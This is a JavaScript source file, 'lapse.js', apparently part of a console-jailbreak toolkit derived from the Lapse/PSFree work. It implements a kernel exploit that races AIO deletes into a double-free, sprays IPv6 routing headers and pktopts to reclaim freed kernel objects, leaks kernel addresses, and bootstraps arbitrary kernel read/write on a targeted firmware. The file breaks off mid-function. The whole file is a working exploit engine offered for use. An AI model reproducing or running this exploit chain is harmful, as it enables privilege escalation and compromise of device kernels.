/*
 * SPDX-License-Identifier: AGPL-3.0-or-later
 * Derived from Y2JB payloads/lapse.js and PSFree/Lapse work.
 * Copyright (C) 2025 Gezine and anonymous contributors.
 * See THIRD_PARTY_NOTICES.md before distribution.
 */
(function (root) {
    "use strict";

    var NS = root.Slopkit = root.Slopkit || {};
    var U64 = NS.U64;
    var writeU64LE = NS.writeU64LE;
    var readU64LE = NS.readU64LE;
    var writeU32LE = NS.writeU32LE;
    var readU32LE = NS.readU32LE;
    if (!U64 || !NS.RopChain || !NS.Ipv6KernelRw)
        throw new Error("rop.js and ipv6-kernel-rw.js must be loaded before lapse.js");

    var LAPSE_ENGINE_REVISION = "lapse-profiled-r13-reclaim-gated";

    // Compatibility export for callers that displayed the original 10.01
    // tuning. The engine never falls back to this record: every operational
    // profile must supply and validate its own complete Lapse configuration.
    var DEFAULT_LAPSE_CONFIG = Object.freeze({
        revision: LAPSE_ENGINE_REVISION,
        firmware: "10.01",
        mainCore: 4,
        mainRtprio: 0x100,
        groomGroups: 0x200,
        spraySockets: 64,
        alternateSockets: 48,
        raceAttempts: 100,
        aliasAttempts: 100,
        leakRecords: 16,
        leakRounds: 32,
        clobberAttempts: 8,
        eventHandles: 0x100,
        curprocReadAttempts: 3,
        maxAioIds: 0x80,
        raceThreadWaitRounds: 2000,
        rthdrSize: 0x80,
        rthdrMarkerOffset: 4
    });
    var LAPSE_CONFIG_FIELDS = Object.freeze([
        "mainCore", "mainRtprio", "groomGroups", "spraySockets",
        "alternateSockets", "raceAttempts", "aliasAttempts",
        "leakRecords", "leakRounds", "clobberAttempts", "eventHandles",
        "curprocReadAttempts", "maxAioIds", "raceThreadWaitRounds",
        "rthdrSize", "rthdrMarkerOffset"
    ]);

    function configFingerprint(config) {
        return config.firmware + "-g" + config.groomGroups
            + "-s" + config.spraySockets + "-a" + config.alternateSockets
            + "-r" + config.raceAttempts + "-l" + config.leakRounds
            + "-c" + config.clobberAttempts
            + "-cp" + config.curprocReadAttempts
            + "-ai" + config.maxAioIds + "-rw" + config.raceThreadWaitRounds
            + "-rh" + config.rthdrSize + ":" + config.rthdrMarkerOffset
            + "-" + config.revision;
    }

    var DEFAULT_CONFIG_FINGERPRINT = configFingerprint(DEFAULT_LAPSE_CONFIG);

    function loadLapseConfig(profile) {
        if (!profile || typeof profile.lapseConfig !== "function")
            throw new Error("lapse: profile configuration is unavailable");
        var supplied = profile.lapseConfig();
        if (!supplied || typeof supplied !== "object" || Array.isArray(supplied))
            throw new Error("lapse: profile configuration is invalid");
        if (supplied.revision !== LAPSE_ENGINE_REVISION)
            throw new Error("lapse: configuration revision is not implemented");
        if (typeof supplied.firmware !== "string" || !supplied.firmware
                || supplied.firmware !== profile.firmware)
            throw new Error("lapse: configuration firmware mismatch");
        for (var i = 0; i < LAPSE_CONFIG_FIELDS.length; ++i) {
            var name = LAPSE_CONFIG_FIELDS[i];
            var value = supplied[name];
            if (!Number.isSafeInteger(value) || value < 0)
                throw new Error("lapse: invalid configuration field " + name);
        }
        if (supplied.mainCore >= 128 || supplied.mainRtprio > 0xffff
                || supplied.groomGroups === 0 || supplied.spraySockets < 2
                || supplied.alternateSockets < 2
                || supplied.raceAttempts === 0 || supplied.aliasAttempts === 0
                || supplied.leakRecords < 2 || supplied.leakRounds === 0
                || supplied.clobberAttempts === 0
                || supplied.eventHandles === 0
                || supplied.curprocReadAttempts === 0
                || supplied.maxAioIds === 0
                || supplied.raceThreadWaitRounds === 0
                || supplied.rthdrSize < 0x80
                || (supplied.rthdrSize & 7) !== 0
                || supplied.rthdrMarkerOffset + 4 > supplied.rthdrSize
                || (supplied.rthdrMarkerOffset & 3) !== 0)
            throw new Error("lapse: unsafe profile configuration geometry");
        return Object.freeze(Object.assign({}, supplied));
    }
    var RACE_PHASE_NONE = 0;
    var RACE_PHASE_WORKER_READY = 1;
    var RACE_PHASE_WORKER_SUSPENDED = 2;
    var RACE_PHASE_MAIN_DELETE_STARTED = 3;
    var RACE_PHASE_MAIN_DELETE_RETURNED = 4;
    var RACE_PHASE_WORKER_RESUMED = 5;
    var RACE_PHASE_WORKER_DELETE_OBSERVED = 6;
    var RACE_PHASE_RTHDR_RECLAIM_STARTED = 7;
    var RACE_PHASE_RTHDR_ALIAS_ACQUIRED = 8;
    var RACE_PHASE_WORKER_JOINED = 9;
    var RACE_PHASE_RESOURCES_CLOSED = 10;
    var DEFERRED_CHECKPOINT_CAPACITY = 4;
    var DEFERRED_CHECKPOINT_WORDS = 4;
    var DEFERRED_LEAK_OBJECTS = 1;
    var DEFERRED_RECLAIM_START = 2;
    var DEFERRED_RW_START = 3;
    var DEFERRED_RW_RECLAIMED = 4;
    var DEFERRED_RW_SLOW_CANARY = 5;
    var SLOW_CURPROC_SAMPLE_WORDS = 5;

    var AIO_CMD_READ = 1;
    var AIO_CMD_WRITE = 2;
    var AIO_CMD_FLAG_MULTI = 0x1000;
    var AIO_CMD_MULTI_READ = AIO_CMD_READ | AIO_CMD_FLAG_MULTI;
    var AIO_CMD_MULTI_WRITE = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;
    var AIO_STATE_COMPLETE = 3;
    var AIO_STATE_ABORTED = 4;

    var SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    var TCPS_ESTABLISHED = 4;

    var IPV6_2292PKTOPTIONS = 25;

    function LapseKernel(options) {
        this.bridge = options.bridge;
        this.allocator = options.allocator;
        this.memory = options.memory;
        this.profile = options.profile;
        this.webkitBase = options.webkitBase;
        this.kernelBase = options.kernelBase;
        this.config = loadLapseConfig(this.profile);
        this.configFingerprint = configFingerprint(this.config);
        this.markDirty = options.markDirty || function () {};
        this.markProgress = options.markProgress || function () {};
        this.onProgress = options.onProgress || null;

        this.dirty = false;
        this.rebootRequired = false;
        this.preDirtyCleanupVerified = false;
        this.fast = false;
        // Full resource cleanup is safe until the first double-free attempt.
        // It becomes safe again only after every corrupt kernel pointer has
        // been repaired through the verified full R/W primitive.
        this.cleanupSafe = true;
        this.cleanupDone = false;
        this.firstReclaimComplete = false;
        this.stage = "constructed";
        this.sealed = false;
        this.sealResult = null;
        this.resourcePolicy = {
            requiresSeal: true,
            sealBeforePayloadDelivery: true,
            retainAllocator: true,
            retainMemory: true,
            expectedParkedWorkers: 0,
            closeSafe: false,
            payloadDeliverySafe: false,
            retainedUntilReboot: false
        };

        this.c = this.profile.raw.kernel.constants;

        this.sds = [];
        this.sdsAlt = [];
        this.blockFd = -1;
        this.unblockFd = -1;
        this.blockId = null;
        this.groomIds = null;
        this.groomIdCount = 0;
        this.groomCancelled = false;
        this.currentPid = 0;

        this.aliasedPair = null;
        this.pktoptsPair = [-1, -1];
        this.leakedAddrs = {
            evf: -1,
            kernelAddr: null,
            kbufAddr: null,
            reqs1Addr: null,
            reqs2Off: -1,
            targetId: -1,
            aioInfoAddr: null,
            fakeReqs3Addr: null,
            fakeReqs3Sd: -1
        };

        this.ipv6Rw = null;
        this.curproc = U64.zero();
        this.curprocFd = U64.zero();
        this.fdt = U64.zero();
        this.fdtOfiles = U64.zero();
        this.fileTableView = {
            filedesc: this.curprocFd,
            table: this.fdt,
            entries: this.fdtOfiles,
            capacity: 0,
            reader: "none"
        };

        this.mainOriginalAffinity = null;
        this.mainOriginalPriority = null;
        this.mainCore = null;
        this.mainAffinityApplied = false;
        this.mainPriorityApplied = false;

        this.buffers = {};
        this.fileHoldRecords = [];
        this.restrictedTransportFds = [];
        this.repairJournal = [];
        // Allocate the complete deferred journal before any AIO object can be
        // freed. The sensitive writer below stores numeric words only.
        this.deferredCheckpointJournal = new Uint32Array(
            DEFERRED_CHECKPOINT_CAPACITY * DEFERRED_CHECKPOINT_WORDS);
        this.deferredCheckpointCount = 0;
        this.deferredCheckpointOverflow = 0;
        this.deferredCheckpointStageCode = 0;
        this.deferredCheckpointPublishSafe = false;
        this.slowCurprocJournal = new Uint32Array(
            this.config.curprocReadAttempts * SLOW_CURPROC_SAMPLE_WORDS);
        this.slowCurprocAioLo = 0;
        this.slowCurprocAioHi = 0;
        this.attemptDiagnostics = {
            configRevision: this.config.revision,
            configFingerprint: this.configFingerprint,
            firmware: this.config.firmware,
            raceAttempt: 0,
            racePhase: RACE_PHASE_NONE,
            unsafeReason: null,
            unsafeReported: false,
            safeFailure: false,
            cleanupWarnings: [],
            preDirtyCleanupVerified: false,
            evfAttempt: 0,
            leak: {
                limit: this.config.leakRounds,
                selectedRound: 0,
                reqs2Offset: -1,
                fakeReqs3Offset: -1,
                maxLength: 0,
                reqs2Rounds: 0,
                fakeReqs3Rounds: 0,
                finalSnapshotVerified: false
            },
            fileTable: {
                capacity: 0,
                refreshes: 0,
                slowRefreshes: 0,
                restrictedRefreshes: 0,
                fullRefreshes: 0,
                lastReader: "none",
                tableRelocations: 0,
                filedescRelocations: 0
            },
            slowCurproc: {
                maxAttempts: this.config.curprocReadAttempts,
                expectedPid: 0,
                attempts: 0,
                recovered: false,
                verified: false,
                candidateChanges: 0,
                lastCandidate: null,
                lastPid: null,
                sampleSummary: "",
                failureDetail: ""
            },
            repair: { rthdrSlots: 0, socketRefs: 0 },
            deferredCheckpoints: {
                capacity: DEFERRED_CHECKPOINT_CAPACITY,
                recorded: 0,
                published: 0,
                overflow: false
            },
            seal: null,
            terminalStage: "constructed"
        };
    }

    LapseKernel.prototype.setStage = function (stage) {
        this.deferredCheckpointStageCode = 0;
        this.stage = stage;
        this.attemptDiagnostics.terminalStage = stage;
    };

    LapseKernel.prototype.checkpoint = function (stage, detail, durable) {
        this.setStage(stage);
        try {
            if (this.onProgress) this.onProgress(stage, detail || "");
        } catch {}
        if (!durable) return;
        try {
            var tag = "LAPSE-" + stage.toUpperCase().replace(/[^A-Z0-9]+/g, "-");
            this.markProgress(tag, detail || undefined);
        } catch {}
    };

    // Some leaked fields are intentionally consumed after their owning AIO
    // object has been freed. This writer must remain numeric and allocation-
    // free: its typed storage and diagnostic record were created above, before
    // the unsafe interval begins.
    LapseKernel.prototype.recordDeferredCheckpoint = function (code, a, b, c) {
        var numericCode = code >>> 0;
        var index = this.deferredCheckpointCount >>> 0;
        this.deferredCheckpointStageCode = numericCode;
        if (index >= DEFERRED_CHECKPOINT_CAPACITY) {
            this.deferredCheckpointOverflow = 1;
            this.attemptDiagnostics.deferredCheckpoints.overflow = true;
            return false;
        }
        var base = index * DEFERRED_CHECKPOINT_WORDS;
        var journal = this.deferredCheckpointJournal;
        journal[base] = numericCode;
        journal[base + 1] = a >>> 0;
        journal[base + 2] = b >>> 0;
        journal[base + 3] = c >>> 0;
        this.deferredCheckpointCount = index + 1;
        this.attemptDiagnostics.deferredCheckpoints.recorded = index + 1;
        return true;
    };

    function deferredCheckpointStage(code) {
        switch (code) {
        case DEFERRED_LEAK_OBJECTS: return "leak-objects";
        case DEFERRED_RECLAIM_START: return "reclaim-start";
        case DEFERRED_RW_START: return "rw-start";
        case DEFERRED_RW_RECLAIMED: return "rw-reclaimed";
        case DEFERRED_RW_SLOW_CANARY: return "rw-slow-canary";
        default: return null;
        }
    }

    function deferredCheckpointDetail(code, a, b, c) {
        switch (code) {
        case DEFERRED_LEAK_OBJECTS:
            return "Found reqs2/fake_reqs3 in round " + a
                + " offsets=0x" + b.toString(16) + "/0x" + c.toString(16);
        case DEFERRED_RECLAIM_START:
            return "Triggering pktopts aliasing";
        case DEFERRED_RW_START:
            return "Bootstrapping kernel R/W";
        case DEFERRED_RW_RECLAIMED:
            return "Main pktopts reclaimed";
        default:
            return "Unknown deferred checkpoint " + code;
        }
    }

    LapseKernel.prototype.materializeDeferredTerminalStage = function () {
        if (!this.deferredCheckpointPublishSafe) return false;
        var stage = deferredCheckpointStage(
            this.deferredCheckpointStageCode >>> 0);
        if (!stage) return false;
        this.setStage(stage);
        return true;
    };

    LapseKernel.prototype.publishDeferredCheckpoints = function () {
        if (!this.deferredCheckpointPublishSafe) return false;
        var journal = this.deferredCheckpointJournal;
        if (!journal) return false;
        var count = this.deferredCheckpointCount >>> 0;
        var overflow = this.deferredCheckpointOverflow !== 0;
        this.deferredCheckpointCount = 0;
        this.deferredCheckpointOverflow = 0;
        this.deferredCheckpointStageCode = 0;
        for (var i = 0; i < count; ++i) {
            try {
                var base = i * DEFERRED_CHECKPOINT_WORDS;
                var code = journal[base];
                var stage = deferredCheckpointStage(code);
                var detail = deferredCheckpointDetail(code,
                    journal[base + 1], journal[base + 2], journal[base + 3]);
                var tag = "LAPSE-" + (stage || "deferred-checkpoint")
                    .toUpperCase()
                    .replace(/[^A-Z0-9]+/g, "-");
                this.markProgress(tag, detail);
            } catch {}
        }
        journal.fill(0);
        this.attemptDiagnostics.deferredCheckpoints.published += count;
        if (overflow) {
            try {
                this.markProgress("LAPSE-CHECKPOINT-JOURNAL-OVERFLOW",
                    "Deferred checkpoint journal capacity exceeded");
            } catch {}
        }
        return true;
    };

    LapseKernel.prototype.configDetail = function () {
        return "cfg=" + this.configFingerprint;
    };

    LapseKernel.prototype.diagnosticsSnapshot = function () {
        var leak = this.attemptDiagnostics.leak;
        var fileTable = this.attemptDiagnostics.fileTable;
        var slowCurproc = this.attemptDiagnostics.slowCurproc;
        var repair = this.attemptDiagnostics.repair;
        var deferredCheckpoints = this.attemptDiagnostics.deferredCheckpoints;
        return {
            configRevision: this.attemptDiagnostics.configRevision,
            configFingerprint: this.attemptDiagnostics.configFingerprint,
            firmware: this.attemptDiagnostics.firmware,
            raceAttempt: this.attemptDiagnostics.raceAttempt,
            racePhase: this.attemptDiagnostics.racePhase,
            unsafeReason: this.attemptDiagnostics.unsafeReason,
            unsafeReported: this.attemptDiagnostics.unsafeReported,
            safeFailure: this.attemptDiagnostics.safeFailure,
            cleanupWarnings: Array.isArray(
                this.attemptDiagnostics.cleanupWarnings)
                ? this.attemptDiagnostics.cleanupWarnings.slice() : [],
            preDirtyCleanupVerified:
                this.attemptDiagnostics.preDirtyCleanupVerified === true,
            evfAttempt: this.attemptDiagnostics.evfAttempt,
            leak: {
                limit: leak.limit,
                selectedRound: leak.selectedRound,
                reqs2Offset: leak.reqs2Offset,
                fakeReqs3Offset: leak.fakeReqs3Offset,
                maxLength: leak.maxLength,
                reqs2Rounds: leak.reqs2Rounds,
                fakeReqs3Rounds: leak.fakeReqs3Rounds,
                finalSnapshotVerified: leak.finalSnapshotVerified
            },
            fileTable: {
                capacity: fileTable.capacity,
                refreshes: fileTable.refreshes,
                slowRefreshes: fileTable.slowRefreshes,
                restrictedRefreshes: fileTable.restrictedRefreshes,
                fullRefreshes: fileTable.fullRefreshes,
                lastReader: fileTable.lastReader,
                tableRelocations: fileTable.tableRelocations,
                filedescRelocations: fileTable.filedescRelocations
            },
            slowCurproc: {
                maxAttempts: slowCurproc.maxAttempts,
                expectedPid: slowCurproc.expectedPid,
                attempts: slowCurproc.attempts,
                recovered: slowCurproc.recovered,
                verified: slowCurproc.verified,
                candidateChanges: slowCurproc.candidateChanges,
                lastCandidate: slowCurproc.lastCandidate,
                lastPid: slowCurproc.lastPid,
                sampleSummary: slowCurproc.sampleSummary
            },
            repair: {
                rthdrSlots: repair.rthdrSlots,
                socketRefs: repair.socketRefs
            },
            deferredCheckpoints: {
                capacity: deferredCheckpoints.capacity,
                recorded: deferredCheckpoints.recorded,
                published: deferredCheckpoints.published,
                overflow: deferredCheckpoints.overflow
            },
            seal: this.attemptDiagnostics.seal,
            terminalStage: this.attemptDiagnostics.terminalStage,
            dirty: this.dirty,
            cleanupSafe: this.cleanupSafe,
            sealed: this.sealed
        };
    };

    // The reference performs a single aio_info -> curproc -> p_pid walk.  A
    // failed hardware run showed that the slow primitive can instead return a
    // kernel-looking candidate whose p_pid is unrelated.  Retry only this
    // read-only, semantically verifiable chain; never accept a candidate that
    // does not exactly match getpid().  The following p_fd walk supplies a
    // second independent structural check before the value is used.
    LapseKernel.prototype.resolvePidVerifiedCurproc = function (
            read8, aioInfoAddr, currentPid) {
        if (typeof read8 !== "function")
            throw new Error("lapse: slow curproc reader is unavailable");
        var aioInfo = this.assertKernelPointer(aioInfoAddr,
            "aio_info for curproc");
        var expectedPid = currentPid >>> 0;
        if (expectedPid === 0)
            throw new Error("lapse: invalid current pid");

        var procPid = this.off("kernel.structures.procPid");
        var maxAttempts = this.config.curprocReadAttempts;
        var diag = this.attemptDiagnostics.slowCurproc;
        var journal = this.slowCurprocJournal;
        journal.fill(0);
        this.slowCurprocAioLo = aioInfo.lo >>> 0;
        this.slowCurprocAioHi = aioInfo.hi >>> 0;
        var previousLo = 0;
        var previousHi = 0;
        var hasPrevious = false;
        var resolved = null;
        diag.maxAttempts = maxAttempts;
        diag.expectedPid = expectedPid;
        diag.attempts = 0;
        diag.recovered = false;
        diag.verified = false;
        diag.candidateChanges = 0;
        diag.lastCandidate = null;
        diag.lastPid = null;
        diag.sampleSummary = "";
        diag.failureDetail = "";

        for (var attempt = 1; attempt <= maxAttempts; ++attempt) {
            var candidate = U64.from(read8(aioInfo.add32(8)));
            var base = (attempt - 1) * SLOW_CURPROC_SAMPLE_WORDS;
            journal[base] = candidate.lo >>> 0;
            journal[base + 1] = candidate.hi >>> 0;
            diag.attempts = attempt;
            if (hasPrevious && (previousLo !== candidate.lo
                    || previousHi !== candidate.hi))
                diag.candidateChanges += 1;
            previousLo = candidate.lo;
            previousHi = candidate.hi;
            hasPrevious = true;

            if (!candidate.isKernelPointer()) {
                diag.lastPid = null;
                continue;
            }

            var pidWord = U64.from(read8(candidate.add32(procPid)));
            journal[base + 2] = pidWord.lo >>> 0;
            journal[base + 3] = pidWord.hi >>> 0;
            journal[base + 4] = 1;
            var observedPid = pidWord.lo >>> 0;
            diag.lastPid = observedPid;
            if (observedPid === expectedPid) {
                resolved = candidate;
                break;
            }
        }

        diag.recovered = resolved !== null && diag.attempts > 1;
        diag.verified = resolved !== null;
        if (resolved !== null) return resolved;
        throw new Error("lapse: curproc verification failed");
    };

    LapseKernel.prototype.materializeSlowCurprocDiagnostics = function () {
        if (!this.deferredCheckpointPublishSafe) return false;
        var diag = this.attemptDiagnostics
            && this.attemptDiagnostics.slowCurproc;
        if (!diag || !this.slowCurprocJournal) return false;
        var attempts = diag.attempts >>> 0;
        if (attempts === 0) return true;
        var journal = this.slowCurprocJournal;
        var samples = new Array(attempts);
        for (var i = 0; i < attempts; ++i) {
            var base = i * SLOW_CURPROC_SAMPLE_WORDS;
            var candidate = new U64(journal[base], journal[base + 1]);
            var pid = journal[base + 4]
                ? new U64(journal[base + 2], journal[base + 3]) : null;
            samples[i] = (i + 1) + ":" + candidate.toHex() + "/"
                + (pid ? pid.toHex() : "invalid");
        }
        diag.lastCandidate = new U64(
            journal[(attempts - 1) * SLOW_CURPROC_SAMPLE_WORDS],
            journal[(attempts - 1) * SLOW_CURPROC_SAMPLE_WORDS + 1]).toHex();
        diag.sampleSummary = samples.join(",");
        if (diag.verified) return true;
        var leak = this.attemptDiagnostics.leak;
        var leakDetail = leak ? " leakRound=" + leak.selectedRound
            + " offsets=0x" + leak.reqs2Offset.toString(16)
            + "/0x" + leak.fakeReqs3Offset.toString(16) : "";
        var aioInfo = new U64(this.slowCurprocAioLo,
            this.slowCurprocAioHi);
        diag.failureDetail = " aio=" + aioInfo.toHex()
            + " expectedPid=" + diag.expectedPid
            + leakDetail + " samples=" + diag.sampleSummary;
        return true;
    };

    // The p_fd chain must be read through the primitive that is valid for the
    // current overlap phase. slowKread8 stops being usable once ip6po_pktinfo
    // is redirected to the worker pktopts; pipe/socket allocation after that
    // transition must therefore refresh through the restricted reader.
    LapseKernel.prototype.refreshFileTableWith = function (read8, readerName) {
        if (typeof read8 !== "function")
            throw new Error("lapse: file-table reader is unavailable");
        if (readerName !== "slow" && readerName !== "restricted")
            throw new Error("lapse: invalid file-table reader " + readerName);
        var curprocLabel = readerName === "slow"
            ? "slow curproc for file-table refresh"
            : "restricted curproc for file-table refresh";
        var filedescLabel = readerName === "slow"
            ? "slow curproc filedesc" : "restricted curproc filedesc";
        var tableLabel = readerName === "slow"
            ? "slow descriptor table" : "restricted descriptor table";
        var entriesLabel = readerName === "slow"
            ? "slow descriptor entries" : "restricted descriptor entries";
        this.assertKernelPointer(this.curproc,
            curprocLabel);

        var previousFiledesc = this.curprocFd;
        var previousFdt = this.fdt;
        var procFd = this.off("kernel.structures.procFd");
        var fdtOfilesOff = this.off("kernel.structures.fdtOfiles");
        var currentFiledesc = this.assertKernelPointer(
            read8(this.curproc.add32(procFd)),
            filedescLabel);
        var currentFdt = this.assertKernelPointer(read8(currentFiledesc),
            tableLabel);
        var capacity = U64.from(read8(currentFdt)).lo >>> 0;
        if (capacity === 0 || capacity > 0x100000)
            throw new Error("lapse: invalid " + readerName
                + " descriptor-table capacity " + capacity);
        var entries = this.assertKernelPointer(
            currentFdt.add32(fdtOfilesOff),
            entriesLabel);

        this.curprocFd = currentFiledesc;
        this.fdt = currentFdt;
        this.fdtOfiles = entries;
        var diag = this.attemptDiagnostics.fileTable;
        diag.refreshes += 1;
        diag.lastReader = readerName;
        if (readerName === "slow") diag.slowRefreshes += 1;
        else diag.restrictedRefreshes += 1;
        diag.capacity = capacity;
        if (!previousFiledesc.isZero()
                && !previousFiledesc.eq(currentFiledesc))
            diag.filedescRelocations += 1;
        if (!previousFdt.isZero() && !previousFdt.eq(currentFdt))
            diag.tableRelocations += 1;
        var view = this.fileTableView;
        view.filedesc = currentFiledesc;
        view.table = currentFdt;
        view.entries = entries;
        view.capacity = capacity;
        view.reader = readerName;
        return view;
    };

    LapseKernel.prototype.enterUnsafe = function (reason) {
        if (this.dirty) return;
        // Runtime durably records the one-attempt boot guard before run().
        // Keep this transition memory-only: synchronous storage/UI work while
        // the race worker is suspended changes the timing of the vulnerable
        // delete window.
        this.dirty = true;
        this.rebootRequired = true;
        this.cleanupSafe = false;
        this.attemptDiagnostics.unsafeReason = reason;
    };

    LapseKernel.prototype.publishUnsafe = function () {
        if (!this.dirty || this.attemptDiagnostics.unsafeReported) return;
        this.attemptDiagnostics.unsafeReported = true;
        try { this.markDirty(this.attemptDiagnostics.unsafeReason); }
        catch {}
    };

    LapseKernel.prototype.off = function (path) {
        return this.profile.offset(path);
    };

    LapseKernel.prototype.k = function (path) {
        return this.kernelBase + this.off(path);
    };

    LapseKernel.prototype.call = function (path, args) {
        return this.bridge.callOffset(path, args);
    };

    LapseKernel.prototype.callI32 = function (path, args) {
        return this.bridge.callOffsetI32(path, args);
    };

    LapseKernel.prototype.alloc = function (size, align, label) {
        return this.allocator.alloc(size, align, label);
    };

    LapseKernel.prototype.yield = function (count) {
        var n = count || 1;
        while (n-- > 0) this.call("native.exports.schedYield", []);
    };

    LapseKernel.prototype.sleep = function (ms) {
        var ts = this.alloc(16, 8, "lapse-sleep");
        ts.put64(0, Math.floor(ms / 1000));
        ts.put64(8, (ms % 1000) * 1000000);
        this.call("native.exports.nanosleep", [ts.address, 0]);
    };

    LapseKernel.prototype.waitThreadSignal = function (signal, label, delay) {
        var waitDelay = delay || this.alloc(16, 8, label + "-delay");
        if (!delay) {
            waitDelay.put64(0, 0);
            waitDelay.put64(8, 1000000);
        }
        for (var wait = 0; wait < this.config.raceThreadWaitRounds
                && signal.get32(0) === 0; ++wait)
            this.call("native.exports.nanosleep", [waitDelay.address, 0]);
        if (signal.get32(0) !== 1)
            throw new Error("lapse: " + label + " timed out");
    };

    LapseKernel.prototype.joinExitedThread = function (thread, exited, label) {
        if (exited.get32(0) !== 1)
            throw new Error("lapse: refusing to join live " + label);
        var result = this.callI32("native.exports.pthreadJoin", [thread, 0]);
        if (result !== 0)
            throw new Error("lapse: " + label + " join failed " + result);
    };

    LapseKernel.prototype.nativeWrite = function (fd, buf, size) {
        return this.call("native.exports.write", [fd, buf.address, size]).toInt32();
    };

    LapseKernel.prototype.nativeRead = function (fd, buf, size) {
        return this.call("native.exports.read", [fd, buf.address, size]).toInt32();
    };

    LapseKernel.prototype.createPipePair = function (label, nonblock) {
        var out = this.alloc(8, 4, label + "-fds");
        if (this.callI32("native.exports.pipe", [out.address]) !== 0)
            throw new Error(label + ": pipe failed");
        var pair = [out.get32(0) | 0, out.get32(4) | 0];
        if (pair[0] < 0 || pair[1] < 0)
            throw new Error(label + ": bad descriptors");
        if (nonblock) {
            for (var i = 0; i < 2; ++i) {
                var result = this.callI32("native.exports.fcntl",
                    [pair[i], this.c.fSetfl, this.c.oNonblock]);
                if (result !== 0)
                    throw new Error(label + ": fcntl failed " + result);
            }
        }
        return pair;
    };

    LapseKernel.prototype.closeStrict = function (fd, label) {
        if (fd < 0) return;
        var result = this.callI32("native.exports.close", [fd]);
        if (result !== 0)
            throw new Error("lapse: close " + (label || fd) + " failed " + result);
    };

    LapseKernel.prototype.assertKernelPointer = function (value, label) {
        var pointer = U64.from(value);
        if (!pointer.isKernelPointer())
            throw new Error("lapse: invalid " + label + " " + pointer.toHex());
        return pointer;
    };

    LapseKernel.prototype.newSocket = function () {
        var fd = this.callI32("native.exports.socket",
            [this.c.afInet6, this.c.sockDgram, this.c.ipprotoUdp]);
        if (fd < 0) throw new Error("lapse: IPv6 UDP socket failed");
        return fd;
    };

    LapseKernel.prototype.newTcpSocket = function () {
        var fd = this.callI32("native.exports.socket",
            [this.c.afInet, 1, 0]);
        if (fd < 0) throw new Error("lapse: TCP socket failed");
        return fd;
    };

    LapseKernel.prototype.setSockopt = function (fd, level, optname, buf, len) {
        var address = buf && buf.address !== undefined ? buf.address : (buf || 0);
        var result = this.callI32("native.exports.setsockopt",
            [fd, level, optname, address, len]);
        if (result !== 0)
            throw new Error("lapse: setsockopt " + optname + " failed " + result);
        return result;
    };

    LapseKernel.prototype.getSockopt = function (fd, level, optname, buf, len) {
        this.buffers.len.put32(0, len);
        var result = this.callI32("native.exports.getsockopt",
            [fd, level, optname, buf.address, this.buffers.len.address]);
        if (result !== 0)
            throw new Error("lapse: getsockopt " + optname + " failed " + result);
        var actual = this.buffers.len.get32(0);
        if (actual > len)
            throw new Error("lapse: getsockopt " + optname + " overflow "
                + actual + "/" + len);
        return actual;
    };

    LapseKernel.prototype.setRthdr = function (fd, buf, size) {
        return this.setSockopt(fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr,
            buf, size);
    };

    LapseKernel.prototype.getRthdr = function (fd, buf, maxLen) {
        return this.getSockopt(fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr,
            buf, maxLen);
    };

    LapseKernel.prototype.freeRthdr = function (fd) {
        return this.setSockopt(fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr,
            0, 0);
    };

    LapseKernel.prototype.freeRthdrs = function (fds) {
        for (var i = 0; i < fds.length; ++i)
            if (fds[i] >= 0) this.freeRthdr(fds[i]);
    };

    LapseKernel.prototype.buildRthdr = function (buf, size) {
        var len = ((size >> 3) - 1) & ~1;
        var actualSize = (len + 1) << 3;
        buf.put8(0, 0);
        buf.put8(1, len);
        buf.put8(2, 0);
        buf.put8(3, len >> 1);
        return actualSize;
    };

    LapseKernel.prototype.aioSubmitCmd = function (cmd, reqsBuf, numReqs,
            priority, idsBuf) {
        var result = this.callI32("native.exports.aioSubmitCmd",
            [cmd, reqsBuf.address, numReqs, priority, idsBuf.address]);
        if (result === -1) throw new Error("lapse: aio_submit_cmd failed");
        return result;
    };

    LapseKernel.prototype.aioMultiDelete = function (idsBuf, numIds, errsBuf) {
        var result = this.callI32("native.exports.aioMultiDelete",
            [idsBuf.address, numIds, errsBuf.address]);
        if (result === -1) throw new Error("lapse: aio_multi_delete failed");
        return result;
    };

    LapseKernel.prototype.aioMultiPoll = function (idsBuf, numIds, errsBuf) {
        var result = this.callI32("native.exports.aioMultiPoll",
            [idsBuf.address, numIds, errsBuf.address]);
        if (result === -1) throw new Error("lapse: aio_multi_poll failed");
        return result;
    };

    LapseKernel.prototype.aioMultiCancel = function (idsBuf, numIds, errsBuf) {
        var result = this.callI32("native.exports.aioMultiCancel",
            [idsBuf.address, numIds, errsBuf.address]);
        if (result === -1) throw new Error("lapse: aio_multi_cancel failed");
        return result;
    };

    LapseKernel.prototype.aioMultiWait = function (idsBuf, numIds, errsBuf,
            mode, timeoutBuf) {
        var result = this.callI32("native.exports.aioMultiWait",
            [idsBuf.address, numIds, errsBuf.address, mode,
                timeoutBuf ? timeoutBuf.address : 0]);
        if (result === -1) throw new Error("lapse: aio_multi_wait failed");
        return result;
    };

    LapseKernel.prototype.makeReqs1 = function (numReqs) {
        var buf = this.alloc(0x28 * numReqs, 8, "lapse-reqs1");
        for (var i = 0; i < numReqs; ++i)
            buf.put32(i * 0x28 + 0x20, 0xFFFFFFFF);
        return buf;
    };

    LapseKernel.prototype.sprayAio = function (loops, reqsBuf, numReqs,
            idsBuf, multi, cmd, onSubmitted) {
        cmd = cmd || AIO_CMD_READ;
        if (multi === undefined) multi = true;
        var step = 4 * (multi ? numReqs : 1);
        var finalCmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0);
        for (var i = 0; i < loops; ++i) {
            var idsOff = i * step;
            var idsSub = idsBuf.sub(idsOff, 4 * (multi ? numReqs : 1),
                "aio-spray-" + i);
            var result = this.aioSubmitCmd(finalCmd, reqsBuf, numReqs, 3,
                idsSub);
            if (result !== 0)
                throw new Error("lapse: AIO spray submit " + i + " failed "
                    + result);
            if (onSubmitted) onSubmitted(i + 1);
        }
    };

    LapseKernel.prototype.cancelAios = function (idsBuf, numIds) {
        var maxAioIds = this.config.maxAioIds;
        var errsBuf = this.alloc(4 * maxAioIds, 4, "aio-cancel-errs");
        var rem = numIds % maxAioIds;
        var batches = Math.floor((numIds - rem) / maxAioIds);
        for (var i = 0; i < batches; ++i)
            this.aioMultiCancel(
                idsBuf.sub(i * 4 * maxAioIds, 4 * maxAioIds,
                    "aio-cancel-batch"), maxAioIds, errsBuf);
